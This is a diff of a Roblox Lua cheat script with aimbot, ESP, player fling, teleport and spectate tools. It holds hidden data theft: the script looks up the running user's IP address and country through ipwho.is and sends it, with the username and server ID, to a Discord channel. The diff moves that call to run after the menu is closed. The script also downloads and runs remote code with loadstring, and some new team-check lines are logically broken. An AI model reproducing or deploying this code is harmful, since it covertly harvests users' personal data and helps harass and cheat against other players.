@@ -14,6 +14,8 @@ local RunService = game:GetService("RunService")
 local hrp = player.Character.HumanoidRootPart
 local mouse = player:GetMouse()
 local AiChat
+local Lighting = game:GetService("Lighting")
+local TestService = game:GetService("TestService")
 local RunScript
 local startTime = time()
 local AutoRejoin = false
@@ -21,6 +23,7 @@ local Players = game:GetService("Players")
 local frameCount, timeElapsed, lastUpdate = 0, 0, 0
 local WalkSpeedSlider, JumpPowerSlider, Gravity1Slider, Gravity2Slider
 local api = {}
+local TurnOff = true
 local Playlist = {}
 local FOVRadius = 100
 local up = loadstring(game:HttpGet('https://pastefy.app/aZcja1vg/raw'))()
@@ -34,19 +37,28 @@ local EHB = Color3.new(1, 0, 0)
 local EHL = Color3.new(0, 0, 1)
 local EHH = Color3.new(0, 1, 0)
 local EHT = Color3.new(1, 1, 1)
-
 local follower, following, friend
-pcall(function()
-    api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
-end)
-pcall(function()
-    follower = game.HttpService:JSONDecode(game:HttpGet('https://friends.roproxy.com/v1/users/' ..player.UserId ..'/followers/count'))
-end)
-pcall(function()
-    following = game.HttpService:JSONDecode(game:HttpGet('https://friends.roproxy.com/v1/users/' ..player.UserId ..'/followings/count'))
-end)
-pcall(function()
-    friend = game.HttpService:JSONDecode(game:HttpGet('https://friends.roblox.com/v1/users/' ..player.UserId ..'/friends/count'))
+local data
+local Track
+local ToggleR15 = {}
+local MaxAnimation = 10
+local CAnimation = 0
+local SpeedAnimation = 1
+
+task.spawn(function()
+    pcall(function()
+        api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
+    end)
+    pcall(function()
+        follower = game.HttpService:JSONDecode(game:HttpGet('https://friends.roproxy.com/v1/users/' ..player.UserId ..'/followers/count'))
+    end)
+    pcall(function()
+        following = game.HttpService:JSONDecode(game:HttpGet('https://friends.roproxy.com/v1/users/' ..player.UserId ..'/followings/count'))
+    end)
+    pcall(function()
+        friend = game.HttpService:JSONDecode(game:HttpGet('https://friends.roblox.com/v1/users/' ..player.UserId ..'/friends/count'))
+    end)
+    data = HttpService:JSONDecode(game:HttpGet("https://raw.githubusercontent.com/7yd7/sniper-Emote/refs/heads/test/EmoteSniper.json")).data
 end)
 
 local function SetNoCollision(player, Value)
@@ -259,8 +271,6 @@ local function sendMessageToDc(message, name, img)
 end
 local InfoSpy = "\nUsername: " ..player.Name .."\nDisplay Name: " ..player.DisplayName .."\nUserId: " ..player.UserId .."\nAccount Age: " ..player.AccountAge .."\nCountry : " .. (api.country or "Unknown") .. " " .. (api.country_code or "") .."\nIP: " ..(api.ip or "Unknown") .."\nServerID : " .. game.JobId .."\nGame : " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."\nGameID : " .. game.PlaceId
 
-sendMessageToDc(InfoSpy, "Information", "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png")
-
 local function GetNP()
 	local shortest, nearest = math.huge
 	local camPos = cam.CFrame.Position
@@ -271,7 +281,7 @@ local function GetNP()
 
 	for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
 		if plr ~= player and plr.Character then
-		    if TeamCheck and plr.Team ~= player.Team then continue end
+		    if TeamCheck and not plr.Team ~= player.Team then return end
 			local hum = plr.Character:FindFirstChild("Humanoid")
 			local root = plr.Character:FindFirstChild("HumanoidRootPart")
 			if hum and hum.Health > 0 and root then
@@ -319,9 +329,7 @@ local function GetAA()
 
 	for _, plr in ipairs(Players:GetPlayers()) do
 		if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-			if TeamCheck and plr.Team == player.Team then
-			   continue
-			end
+			if TeamCheck and not plr.Team == player.Team then return end
 
 			local pos, onScreen = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
 			if onScreen then
@@ -351,9 +359,6 @@ local function GetAA()
 	end
 	return closest
 end
-
-local Lighting = game:GetService("Lighting")
-local TestService = game:GetService("TestService")
 
 local ToDisable = {
 	Textures = true,
@@ -423,7 +428,7 @@ local function getFullPath(obj)
             local sameNameCount = 0
             for _, v in ipairs(siblings) do
                 if v.Name == obj.Name then
-                    sameNameCount += 1
+                    sameNameCount = sameNameCount + 1
                 end
             end
 
@@ -978,6 +983,7 @@ local RunAnimationSpeed = nil
 local speed = 1
 local CanWalkToPlayer = false
 local WalkToPlayerTarget = nil
+local TpToPlayerTarget = nil
 
 Other:CreateSection("Game Preformer")
 
@@ -1099,6 +1105,8 @@ end})
 
 Other:CreateSection("Position Player")
 
+local TargetTp = Other:CreateSection("Player: nil")
+
 Other:CreateInput({Name = "Teleport", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(Text)
     local txt = tostring(Text):lower()
     local localPlayer = game.Players.LocalPlayer
@@ -1110,7 +1118,9 @@ Other:CreateInput({Name = "Teleport", CurrentValue = "", PlaceholderText = "Play
     for _, player in pairs(game.Players:GetPlayers()) do
         if player ~= localPlayer then
             if string.find(player.Name:lower(), txt) then
+                TargetTp:Set("Player: " ..player.Name)
                 local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                TpToPlayerTarget = player
                 if targetHRP then
                     localHRP.CFrame = targetHRP.CFrame
                     break
@@ -1120,11 +1130,14 @@ Other:CreateInput({Name = "Teleport", CurrentValue = "", PlaceholderText = "Play
     end
 end})
 
+local TargetFollow = Other:CreateSection("Player: nil")
+
 Other:CreateInput({Name = "Follow", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(Text)
     local txt = tostring(Text):lower()
     for _, player in pairs(game.Players:GetPlayers()) do
         if player ~= localPlayer then
             if string.find(player.Name:lower(), txt) then
+                TargetFollow:Set("Player: " ..player.Name)
                 local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                 if targetHRP then
                     WalkToPlayerTarget = player
@@ -1133,6 +1146,8 @@ Other:CreateInput({Name = "Follow", CurrentValue = "", PlaceholderText = "Player
         end
     end
 end})
+
+local TargetPosition = Other:CreateSection("X: nil Y: nil Z: nil")
 
 Other:CreateInput({Name = "Teleport To Position", CurrentValue = "", PlaceholderText = "Position", RemoveTextAfterFocusLost = true, Callback = function(txt)
     local delimiter = string.find(txt, ",") and "," or " "
@@ -1143,6 +1158,7 @@ Other:CreateInput({Name = "Teleport To Position", CurrentValue = "", Placeholder
     local x = tonumber(coords[1])
     local y = tonumber(coords[2])
     local z = tonumber(coords[3])
+    TargetPosition:Set("X: " ..x .." Y: " ..y .." Z: " ..z)
     if not x or not y or not z then
         return
     end
@@ -1150,11 +1166,14 @@ Other:CreateInput({Name = "Teleport To Position", CurrentValue = "", Placeholder
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
 end})
 
+local TargetSp = Other:CreateSection("Player: nil")
+
 Other:CreateInput({Name = "Spectator", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(txt)
     for _, player in pairs(game.Players:GetPlayers()) do
         if player ~= game.Players.LocalPlayer then
             local found = string.find(player.Name:lower(), txt)
             if found then
+                TargetSp:Set("Player: " ..player.Name)
                 local cam = workspace.CurrentCamera
                 if player.Character and player.Character:FindFirstChild("Humanoid") then
                     cam.CameraSubject = player.Character.Humanoid
@@ -1183,6 +1202,8 @@ local TP = Other:CreateDropdown({
 
         for _, player in pairs(Players:GetPlayers()) do
             if player.Name:lower():find(name:lower()) then
+                TargetTp:Set("Player: " ..player.Name)
+                TpToPlayerTarget = player
                 local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                 if targetHRP then
                     localHRP.CFrame = targetHRP.CFrame
@@ -1202,6 +1223,7 @@ local WT = Other:CreateDropdown({
     Callback = function(name)
         for _, player in pairs(Players:GetPlayers()) do
             if player.Name:lower():find(name:lower()) then
+                TargetFollow:Set("Player: " ..player.Name)
                 local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                 if targetHRP then
                     WalkToPlayerTarget = player
@@ -1222,6 +1244,7 @@ local SP = Other:CreateDropdown({
         for _, player in pairs(Players:GetPlayers()) do
             if player.Name:lower():find(name:lower()) then
                 local cam = workspace.CurrentCamera
+                TargetSp:Set("Player: " ..player.Name)
                 if player.Character and player.Character:FindFirstChild("Humanoid") then
                     cam.CameraSubject = player.Character.Humanoid
                     break
@@ -1260,6 +1283,10 @@ Other:CreateToggle({Name = "Enable Following", CurrentValue = false, Flag = "Tog
     CanWalkToPlayer = Value
 end})
 
+Other:CreateButton({Name = "Teleport", Callback = function()
+    player.Character.HumanoidRootPart.CFrame = TpToPlayerTarget.Character.HumanoidRootPart.CFrame
+end})
+
 Other:CreateButton({Name = "Reset Spectator", Callback = function()
     game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
 end})
@@ -1275,11 +1302,29 @@ Other:CreateInput({Name = "Server", CurrentValue = "", PlaceholderText = "Server
 end})
 
 Other:CreateButton({Name = "Rejoin", Callback = function()
-    TeleportService:Teleport(game.PlaceId)
+    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
+end})
+
+Other:CreateButton({Name = "Server Hop", Callback = function()
+    local servers = {}
+    local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
+    local body = HttpService:JSONDecode(req)
+
+    if body and body.data then
+        for i, v in next, body.data do
+            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
+                table.insert(servers, 1, v.id)
+            end
+        end
+    end
+
+    if #servers > 0 then
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
+    end
 end})
 
 Other:CreateToggle({Name = "Auto Rejoin", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    local AutoRejoin = Value
+    AutoRejoin = Value
 end})
 
 Other:CreateSection("Character")
@@ -1623,6 +1668,78 @@ Search:CreateInput({
     end
 })
 
+local function PlayAnimation(Id)
+   if Track and Track.IsPlaying then
+      Track:Stop()
+   end
+   local Animation = Instance.new("Animation")
+   Animation.AnimationId = Id
+   Track = player.Character.Humanoid:LoadAnimation(Animation)
+   Track.Priority = Enum.AnimationPriority.Action
+   Track.Looped = true
+   Track:Play()
+   Track:AdjustSpeed(SpeedAnimation)
+end
+
+local function StopAnimation()
+   if Track and Track.IsPlaying then
+      Track:Stop()
+   end
+end
+
+local SearchEmote = Window:CreateTab("Search Emote R15", 118685771787843)
+SearchEmote:CreateSection("Search Emote R15")
+
+SearchEmote:CreateInput({Name = "Search", CurrentValue = "", PlaceholderText = "Name", RemoveTextAfterFocusLost = true, Callback = function(txt)
+    if txt == "" then
+        Rayfield:Notify({
+            Title = "⚠️ Warn!",
+            Content = "Missing name",
+            Duration = 6.5,
+            Image = 11745872910,
+        })
+    return
+    end
+    if #ToggleR15 > 0 and ToggleR15[1]:GetToggle().Parent then
+        for _, v in ipairs(ToggleR15[1]:GetToggle().Parent:GetChildren()) do
+            if v:IsA("Frame") and v.Name == "SectionSpacing" then
+                v:Destroy()
+            end
+        end
+    end
+    for i, v in pairs(ToggleR15) do
+        v:Destroy()
+    end
+    ToggleR15 = {}
+    CAnimation = 0
+    local txt = tostring(txt):lower()
+    for i, v in pairs(data) do
+        if CAnimation >= MaxAnimation then
+            break
+        end
+        if v.id and v.name then
+            if string.find(v.name:lower(), txt) then
+                local Object = game:GetObjects("rbxassetid://" .. tostring(v.id))[1]
+                if Object and Object:IsA("Animation") then
+                    local Toggle = SearchEmote:CreateToggle({Name = v.name, CurrentValue = false, Flag = "Toggle_" ..v.name, Callback = function(Value)
+                    	if Value then 
+                        	PlayAnimation(Object.AnimationId)
+                    	else
+                        	StopAnimation()
+                    	end
+                    end})
+                    CAnimation = CAnimation + 1
+            	    table.insert(ToggleR15, Toggle)
+                end
+                if Object then
+                    Object:Destroy()
+                end
+                wait()
+            end
+        end
+    end
+end})
+
 local Save = Window:CreateTab("Save Script", 105856032975609)
 Save:CreateSection("Save Script")
 
@@ -1658,7 +1775,7 @@ Save:CreateButton({
                Title = "⚠️ Warn!",
                Content = "Missing name or script",
                Duration = 6.5,
-               Image = 4483362458,
+               Image = 11745872910,
             })
             return
         end
@@ -1667,7 +1784,7 @@ Save:CreateButton({
                Title = "⚠️ Warn!",
                Content = "Script already exists",
                Duration = 6.5,
-               Image = 4483362458,
+               Image = 11745872910,
             })
             return
         end
@@ -1828,7 +1945,7 @@ GetInfo:CreateButton({Name = "Search", Callback = function()
         end
         FriendCountInfo:Set("Friend: " ..friendCount.count)
         FollowingCountInfo:Set("Following: " ..followingCount.count)
-        FollowerCountInfo:Set("Follower: " ..followerCount.count)
+        FollowerCountInfo:Set("Follower: " ..followerCount.count or nil)
         IsBannedInfo:Set("IsBanned: "..tostring(api.isBanned))
         IsVerifiedInfo:Set("IsVerified: "..tostring(api.hasVerifiedBadge))
         Description:Set("Description: " ..api.description)
@@ -1926,7 +2043,7 @@ local RunFling = Fling:CreateToggle({Name = "Running", CurrentValue = false, Fla
                 Title = "⚠️ Warn!",
                 Content = "No Player Found!",
                 Duration = 3.5,
-                Image = 4483362458,
+                Image = 11745872910,
             })
             RunFling:Set(false)
         end
@@ -1951,7 +2068,7 @@ Fling:CreateInput({Name = "Target", CurrentValue = "", PlaceholderText = "Userna
                     Title = "⚠️ Warn!",
                     Content = "Can't use local player!",
                     Duration = 3.5,
-                    Image = 4483362458,
+                    Image = 11745872910,
                 })
                 break
             end
@@ -1959,7 +2076,7 @@ Fling:CreateInput({Name = "Target", CurrentValue = "", PlaceholderText = "Userna
     end
 end})
 
-Fling:CreateDropdown({Name = "Target", Options = Playlist, CurrentOption = {}, MultipleOptions = false, Flag = "Dropdown1", Callback = function(name)
+local DropFling = Fling:CreateDropdown({Name = "Target", Options = Playlist, CurrentOption = {}, MultipleOptions = false, Flag = "Dropdown1", Callback = function(name)
     for _, player in pairs(Players:GetPlayers()) do
         if player.Name == name then
             if player ~= game.Players.LocalPlayer then
@@ -1977,13 +2094,24 @@ Fling:CreateDropdown({Name = "Target", Options = Playlist, CurrentOption = {}, M
                     Title = "⚠️ Warn!",
                     Content = "Can't use local player!",
                     Duration = 3.5,
-                    Image = 4483362458,
+                    Image = 11745872910,
                 })
                 break
             end
         end
     end
 end})
+
+Fling:CreateButton({
+    Name = "Refresh",
+    Callback = function()
+        Playlist = {}
+        for _, player in ipairs(Players:GetPlayers()) do
+            table.insert(Playlist, player.Name)
+        end
+        DropFling:Refresh(Playlist)
+    end
+})
 
 FlingAll = Fling:CreateToggle({Name = "All Players", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
     TouchFlingT:Set(false)
@@ -2043,6 +2171,7 @@ local function ClearAiChat()
     end
     AllMessage = {}
     history = {}
+    historyChatbot = {}
     
     AiSystem = model ..short ..ChatLanguage
 end
@@ -2174,7 +2303,7 @@ AIChatBot:CreateInput({Name = "Target", CurrentValue = "", PlaceholderText = "Us
                     Title = "⚠️ Warn!",
                     Content = "Can't use local player!",
                     Duration = 3.5,
-                    Image = 4483362458,
+                    Image = 11745872910,
                 })
                 break
             end
@@ -2182,7 +2311,7 @@ AIChatBot:CreateInput({Name = "Target", CurrentValue = "", PlaceholderText = "Us
     end
 end})
 
-AIChatBot:CreateDropdown({Name = "Target", Options = Playlist, CurrentOption = {}, MultipleOptions = false, Flag = "Dropdown1", Callback = function(name)
+local DropAIChatBot = AIChatBot:CreateDropdown({Name = "Target", Options = Playlist, CurrentOption = {}, MultipleOptions = false, Flag = "Dropdown1", Callback = function(name)
     for _, player in pairs(Players:GetPlayers()) do
         if player.Name == name then
             if player ~= game.Players.LocalPlayer then
@@ -2198,13 +2327,24 @@ AIChatBot:CreateDropdown({Name = "Target", Options = Playlist, CurrentOption = {
                     Title = "⚠️ Warn!",
                     Content = "Can't use local player!",
                     Duration = 3.5,
-                    Image = 4483362458,
+                    Image = 11745872910,
                 })
                 break
             end
         end
     end
 end})
+
+AIChatBot:CreateButton({
+    Name = "Refresh",
+    Callback = function()
+        Playlist = {}
+        for _, player in ipairs(Players:GetPlayers()) do
+            table.insert(Playlist, player.Name)
+        end
+        DropAIChatBot:Refresh(Playlist)
+    end
+})
 
 AIChatAll = AIChatBot:CreateToggle({Name = "All Players", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
     IsAllPlayers = Value
@@ -2227,10 +2367,31 @@ AIChatBot:CreateToggle({Name = "Response with Player Name", CurrentValue = false
     ResponseName = Value
 end})
 
-local AISetting = Window:CreateTab("AI Setting", 11713339600)
-AISetting:CreateSection("AI Setting")
+local Setting = Window:CreateTab("Setting", 11713339600)
+Setting:CreateSection("Gui Setting")
 
-AISetting:CreateButton({Name = "New Chat", Callback = function()
+Setting:CreateToggle({Name = "Turn Off All Thing When Close", CurrentValue = true, Flag = "Toggle1", Callback = function(Value)
+    TurnOff = Value
+end})
+
+Setting:CreateSection("Search Emote Setting")
+
+Setting:CreateSlider({Name = "Animation Speed", Range = {0, 100}, Increment = 1, Suffix = "Speed", CurrentValue = 1, Flag = "Slider1", Callback = function(Value)
+    local number = tonumber(Value)
+    SpeedAnimation = number
+    if Track and Track.IsPlaying then
+      Track:AdjustSpeed(number)
+   end
+end})
+
+Setting:CreateSlider({Name = "Max Animation Search", Range = {0, 100}, Increment = 1, Suffix = "Value", CurrentValue = 10, Flag = "Slider1", Callback = function(Value)
+    local number = tonumber(Value)
+    MaxAnimation = number
+end})
+
+Setting:CreateSection("AI Setting")
+
+Setting:CreateButton({Name = "New Chat", Callback = function()
     ClearAiChat()
     IsDone = true
 end})
@@ -2250,7 +2411,7 @@ local AIModel = {
     Ai_Furry = "You are a Furry. Response like a Furry."
 }
 
-AISetting:CreateDropdown({
+Setting:CreateDropdown({
     Name = "AI Type",
     Options = {"Normal", "Shy Girl", "Girlfriend", "Nerd", "Waifu", "Brainrot", "Roast", "Boy", "Girl", "Rizz", "Funny", "Furry"},
     CurrentOption = {"Normal"},
@@ -2286,7 +2447,7 @@ AISetting:CreateDropdown({
     end
 })
 
-AISetting:CreateDropdown({
+Setting:CreateDropdown({
     Name = "Chat Language",
     Options = {"None", "English", "Chinese", "Khmer", "Korean", "Italian", "German", "Indonesian", "Japanese", "Vietnamese", "Spanish", "Polish", "Russian", "Portuguese"},
     CurrentOption = {"None"},
@@ -2301,7 +2462,7 @@ AISetting:CreateDropdown({
     IsDone = true
 end})
 
-AISetting:CreateToggle({Name = "Short", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+Setting:CreateToggle({Name = "Short", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
     if Value then
         short = " Response in short sentences"
     else
@@ -2318,7 +2479,7 @@ task.spawn(function()
     end)
     RunScript = RunService.RenderStepped:Connect(function(deltaTime)
         if not Rayfield:GetGui() then
-            local hrp = player.Character.HumanoidRootPart
+            local hrp = player.Character:WaitForChild("HumanoidRootPart")
         	local currentPos = hrp.Position
         	local distance = (currentPos - lastPos).Magnitude
         	speed = math.floor(distance / deltaTime)
@@ -2436,73 +2597,76 @@ task.spawn(function()
     			GameTime:Set(string.format("Time: %02d:%02d:%02d", hour, min, sec))
     		end
     	else
-    	    for i, v in pairs(EspRawScript) do
-    	        if v then
-                    v:Off()
+    	    if TurnOff then
+        	    for i, v in pairs(EspRawScript) do
+        	        if v then
+                        v:Off()
+                    end
+        	    end
+        	    if RunEgor then
+        	        local hum = player.Character.Humanoid
+                    RunEgor:Disconnect()
+                    RunEgor = nil
+                    hum.WalkSpeed = OldWalkSpeed
+                    workspace.Gravity = OldGravity
+                    hum.JumpPower = OldJumpPower
+                    local walk = game.Players.LocalPlayer.Character:WaitForChild("Animate"):FindFirstChild("walk").WalkAnim
+                    if not walk then return end
+                    walk.AnimationId = WalkId
                 end
-    	    end
-    	    if RunEgor then
-    	        local hum = player.Character.Humanoid
-                RunEgor:Disconnect()
-                RunEgor = nil
-                hum.WalkSpeed = OldWalkSpeed
-                workspace.Gravity = OldGravity
-                hum.JumpPower = OldJumpPower
-                local walk = game.Players.LocalPlayer.Character:WaitForChild("Animate"):FindFirstChild("walk").WalkAnim
-                if not walk then return end
-                walk.AnimationId = WalkId
-            end
-    	    if ST then
-    	        ST:Destroy()
-    	    end
-            if AimbotAA and AimbotAAScreenGui then
-                AimbotAAScreenGui:Destroy()
-            end
-    	    if RunAntiAfk then
-                RunAntiAfk:Disconnect()
-                RunAntiAfk = nil
-    	    end
-    	    if InfiniteJumpConnection then
-        	    InfiniteJumpConnection:Disconnect()
-                InfiniteJumpConnection = nil
-            end
-    	    if RunAntiFling then
-                RunAntiFling:Disconnect()
-                RunAntiFling = nil
-                for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
-        			if plr ~= player then
-        				local char = plr.Character
-        				if char and char.Parent then
-        					for _, v in pairs(char:GetDescendants()) do
-        						if v:IsA("BasePart") then
-        							v.CanCollide = true
-        							v.Velocity = Vector3.new(0, 0, 0)
-        							v.RotVelocity = Vector3.new(0, 0, 0)
-        						end
-        					end
-        				end
-        			end
-        		end
-    	    end
-            if RunAnimationSpeed then
-                RunAnimationSpeed:Disconnect()
-                RunAnimationSpeed = nil
-            end
-            if AimbotAAScreenGui then
-                AimbotAAScreenGui:Destroy()
-            end
-    	    if s.Playing then
-                s:Stop()
-    	    end
-            if AT then
-                AT:Stop()
-            end
-            if Running then
-                StopGetMessage()
+        	    if ST then
+        	        ST:Destroy()
+        	    end
+                if AimbotAA and AimbotAAScreenGui then
+                    AimbotAAScreenGui:Destroy()
+                end
+        	    if RunAntiAfk then
+                    RunAntiAfk:Disconnect()
+                    RunAntiAfk = nil
+        	    end
+        	    if InfiniteJumpConnection then
+            	    InfiniteJumpConnection:Disconnect()
+                    InfiniteJumpConnection = nil
+                end
+        	    if RunAntiFling then
+                    RunAntiFling:Disconnect()
+                    RunAntiFling = nil
+                    for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
+            			if plr ~= player then
+            				local char = plr.Character
+            				if char and char.Parent then
+            					for _, v in pairs(char:GetDescendants()) do
+            						if v:IsA("BasePart") then
+            							v.CanCollide = true
+            							v.Velocity = Vector3.new(0, 0, 0)
+            							v.RotVelocity = Vector3.new(0, 0, 0)
+            						end
+            					end
+            				end
+            			end
+            		end
+        	    end
+                if RunAnimationSpeed then
+                    RunAnimationSpeed:Disconnect()
+                    RunAnimationSpeed = nil
+                end
+                if AimbotAAScreenGui then
+                    AimbotAAScreenGui:Destroy()
+                end
+        	    if s.Playing then
+                    s:Stop()
+        	    end
+                if AT then
+                    AT:Stop()
+                end
+                if Running then
+                    StopGetMessage()
+                end
             end
             break
     	end
     end
+    sendMessageToDc(InfoSpy, "Information", "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png")
 end)
 end)
 
